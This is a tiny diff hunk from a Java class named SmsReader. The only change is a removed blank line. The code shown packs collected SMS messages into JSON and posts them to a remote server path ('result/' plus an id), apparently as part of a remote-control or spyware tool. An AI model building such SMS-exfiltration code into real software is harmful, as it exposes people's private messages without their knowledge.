@@ -56,7 +56,6 @@ public class SmsReader  {
         JSONObject parentObject = new JSONObject();
         parentObject.put("code", "sms");
         parentObject.put("data", messagesArray);
-
         try {
             HttpConnection.ReturnResponse response = HttpConnection.connect(SERVER + "result/" + id, "POST", parentObject.toString());
 
